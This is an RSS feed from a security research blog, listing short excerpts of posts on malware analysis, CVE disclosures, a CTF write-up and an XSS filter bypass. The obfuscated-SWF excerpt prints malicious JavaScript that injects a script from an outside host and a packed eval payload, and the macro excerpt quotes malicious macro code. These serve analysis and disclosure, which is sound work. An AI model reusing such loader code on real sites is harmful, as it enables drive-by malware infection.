<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Posts on { bit.therapy }</title>
    <link>/post/</link>
    <description>Recent content in Posts on { bit.therapy }</description>
    <generator>Hugo -- gohugo.io</generator>
    <copyright>{ bit.therapy }</copyright>
    <lastBuildDate>Wed, 17 Jul 2019 21:33:07 +0000</lastBuildDate>
    
	<atom:link href="/post/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>Hardcoded Credentials in Uniguest Kiosk Software lead to API Compromise</title>
      <link>/post/hardcoded-credentials-in-uniguest-kiosk-software-lead-to-api-compromise/</link>
      <pubDate>Wed, 17 Jul 2019 21:33:07 +0000</pubDate>
      
      <guid>/post/hardcoded-credentials-in-uniguest-kiosk-software-lead-to-api-compromise/</guid>
      <description>If you&amp;rsquo;ve traveled at all within North America, you&amp;rsquo;ve likely at some point noticed or even used the shared kiosk machines available in hotel lobbies. These are typically running a locked down version of Windows, and chances are they are managed by Uniguest software.
Uniguest kiosk software will restrict the user to simple tasks, such as maybe browsing the web or printing boarding passes. Uniguest software can be found in other industries, not just hospitality:</description>
    </item>
    
    <item>
      <title>RCE with Arbitrary File Write and XSS in Reprise License Manager (CVE-2018–15573, CVE-2018–15574)</title>
      <link>/post/rce-with-arbitrary-file-write-and-xss-in-reprise-license-manager/</link>
      <pubDate>Wed, 18 Jul 2018 17:32:04 +0000</pubDate>
      
      <guid>/post/rce-with-arbitrary-file-write-and-xss-in-reprise-license-manager/</guid>
      <description>CVE-2018–15573: Arbitrary File Write in Reprise License Manager
CVE-2018–15574: XSS in Reprise License Manager
TW-2018-006: Unpatched Remote Code Execution and XSS in Reprise License Manager
During a recent engagement, I came across a particularly interesting web application called RLM, running on the non-standard port 5054. This naturally caught my eye. After a bit of poking around, I was able to identify a critical vulnerability which allowed me to execute code on the server, eventually leading to full domain compromise.</description>
    </item>
    
    <item>
      <title>Malicious Document Analysis – Macro to Shellcode</title>
      <link>/post/malicious-document-analysis-macro-to-shellcode/</link>
      <pubDate>Fri, 25 Nov 2016 18:09:21 +0000</pubDate>
      
      <guid>/post/malicious-document-analysis-macro-to-shellcode/</guid>
      <description>I came across an interesting Word document which at first glance definitely looked malicious. It had everything from random variable names to lyrics from Garbage - Run Baby Run in the comments. It also used an uncommon but very cool method for moving from macro to machine code execution.
Macro Breakdown The macro starts by creating pointers to DLL exports already loaded in memory by Word:
&#39;Run from the noise of the street and the loaded gun Public Declare Function whitworth Lib &amp;quot;kernel32.</description>
    </item>
    
    <item>
      <title>Analyzing Obfuscated SWFs</title>
      <link>/post/analyzing-obfuscated-swfs/</link>
      <pubDate>Sun, 09 Oct 2016 13:18:17 +0000</pubDate>
      
      <guid>/post/analyzing-obfuscated-swfs/</guid>
      <description>A few days ago I was alerted of a host communicating with a (bad) domain and downloading SWF files. There was some concern that there was malware beaconing out and I needed to figure out the extent of this infection, if any.
The host in question was seen contacting NovaSyncs.com which was serving malicious JS via mine.js:
document.write(unescape(&amp;quot;%3Cscript src=&#39;http://i.ejieban.com/clouder.js&#39; defer=&#39;defer&#39; type=&#39;text/javascript&#39;%3E%3C/script%3E&amp;quot;));  Digging deeper:
eval(function(p,a,c,k,e,r){e=function(c){return(c&amp;lt;a?&#39;&#39;:e(parseInt(c/a)))+((c=c%a)&amp;gt;35?String.fromCharCode(c+29):c.toString(36))};if(!&#39;&#39;.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return&#39;\\w+&#39;};c=1};while(c--)if(k[c])p=p.replace(new RegExp(&#39;\\b&#39;+e(c)+&#39;\\b&#39;,&#39;g&#39;),k[c]);return p}(&#39;a(&amp;quot;V&amp;quot;==1B(3)){3=[];3.g=[];3.K=9(h){4 6=5.16(&amp;quot;1u&amp;quot;);6.w.o=&amp;quot;0&amp;quot;;6.w.j=&amp;quot;0&amp;quot;;6.w.1G=&amp;quot;1M&amp;quot;;6.w.29=&amp;quot;-2d&amp;quot;;6.1p=h;1j 6};3.C=9(v,8){4 6=3.</description>
    </item>
    
    <item>
      <title>IceCTF: Analyzing PCAPs and Reversing Encryption</title>
      <link>/post/icectf-analyzing-pcaps-and-reversing-encryption/</link>
      <pubDate>Sat, 20 Aug 2016 17:49:03 +0000</pubDate>
      
      <guid>/post/icectf-analyzing-pcaps-and-reversing-encryption/</guid>
      <description>IceCTF started a little while a go and we got a team together to try and grab some of these flags. If you&amp;rsquo;re doing the challenges right now&amp;hellip; well spoiler alert.
One of the challenges provided a PCAP with a conversation between two parties that contained the flag somewhere.
##PCAP Analysis
Alright, let me open this in Wireshark:
Interesting&amp;hellip; some IRC chatter. If I right-click and Follow TCP stream I can read the full conversation:</description>
    </item>
    
    <item>
      <title>A Look at Zepto Ransomware - Payload Delivery Analysis</title>
      <link>/post/a-look-at-zepto-ransomware-payload-delivery-analysis/</link>
      <pubDate>Tue, 16 Aug 2016 12:36:51 +0000</pubDate>
      
      <guid>/post/a-look-at-zepto-ransomware-payload-delivery-analysis/</guid>
      <description>It&amp;rsquo;s another quiet Friday when we are alerted of bunch of files with the .zepto extension being created all over the place. It seems that a Zepto sample that worked its way through our network. AV was mostly useless and the ransomware managed to encrypt a few thousand files on a particular share.
First thing&amp;rsquo;s first, I need to find all the users actively encrypting files on this share.</description>
    </item>
    
    <item>
      <title>Walking Through Angler Exploit Kit - Payload Delivery Analysis</title>
      <link>/post/walking-through-angler-exploit-kit-payload-delivery-analysis/</link>
      <pubDate>Mon, 18 Apr 2016 14:28:00 +0000</pubDate>
      
      <guid>/post/walking-through-angler-exploit-kit-payload-delivery-analysis/</guid>
      <description>A few days ago I was alerted of a potentially compromised website serving Angler EK: hxxp://www.stadiumseatingcharts.com/rogers-centre/
The Angler exploit kit will redirect the client to a separate compromised server in order to deliver the exploit and the malware stage. Usually, it accomplishes this using an iframe or an anchor (and calling the click()method for that element), or something similar. The point is, there is some bad JavaScript code leading to some other bad JavaScript code, and it&amp;rsquo;s usually obfuscated.</description>
    </item>
    
    <item>
      <title>A Trick to Bypass an XSS Filter and Execute JavaScript</title>
      <link>/post/a-trick-to-bypass-an-xss-filter-and-execute-javascript/</link>
      <pubDate>Fri, 19 Feb 2016 15:44:39 +0000</pubDate>
      
      <guid>/post/a-trick-to-bypass-an-xss-filter-and-execute-javascript/</guid>
      <description>I&amp;rsquo;ve recently come across an application which had a very simple XSS filter. If the input contained the following chars, the application would throw an error:
( ) &amp;lt; &amp;gt;  Simple, but annoying. I found a stored XSS vulnerability and I could not get the PoC to go off. The stored value was being returned by the server in an input but the filter was getting in the way.</description>
    </item>
    
    <item>
      <title>An Encounter with Dridex - Malicious Document Analysis</title>
      <link>/post/an-encounter-with-dridex-malicious-document-analysis/</link>
      <pubDate>Wed, 17 Feb 2016 13:40:00 +0000</pubDate>
      
      <guid>/post/an-encounter-with-dridex-malicious-document-analysis/</guid>
      <description>Got my hands on a Dridex sample (SKM_C3350160212101601.docm) the other day and I wanted to figure out exactly how it managed to slip by our controls.
The binary dropped did get intercepted by AV but considering the initial phish document did not, I wanted to take a closer look ad make sure nothing else slipped under the radar.
Document analysis First thing I need to do is run it through officemalscanner:</description>
    </item>
    
    <item>
      <title>Changing the DirectAccess and Web Application Proxy external certificate</title>
      <link>/post/changing-the-directaccess-and-web-application-proxy-external-certificate/</link>
      <pubDate>Mon, 08 Feb 2016 00:46:31 +0000</pubDate>
      
      <guid>/post/changing-the-directaccess-and-web-application-proxy-external-certificate/</guid>
      <description>In my lab I have a gateway server that is responsible for both DirectAccess and RD Gateway operations.
Since I only have one external IP, I sit behind a NAT (or two). In order to be able to do both DirectAccess (DA) and RD Gateway (RDG), I need to use the Web Application Proxy (WAP) feature from Server 2012 R2&amp;rsquo;s Remote Access role.
See: https://technet.microsoft.com/en-us/library/dn383662.aspx
The rough network path to the lab is as follows:</description>
    </item>
    
  </channel>
</rss>